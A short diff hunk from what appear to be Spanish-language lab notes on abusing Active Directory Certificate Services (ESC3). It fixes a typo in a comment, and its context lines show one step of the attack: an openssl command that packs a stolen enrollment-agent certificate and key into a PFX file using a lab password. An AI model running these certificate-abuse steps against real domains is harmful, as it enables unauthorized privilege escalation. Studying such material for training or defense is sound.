@@ -226,7 +226,7 @@ Paso 2 (Abusar de la forma 1):
 Paso 3 (Abusar de la forma 1):
 ❯ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
 	# esc3.pem = Es el certificado obtenido: `-----BEGIN RSA PRIVATE KEY-----` y `-----END CERTIFICATE-----` del comando anterior (IMPORTANTE)
-	# Solocar la password = SecretPass@123
+	# Colocar la password = SecretPass@123
 	# esc3-agent.pfx = Es el resultado del comando (IMPORTANTE)
 
 Paso 4 (Abusar de la forma 1):
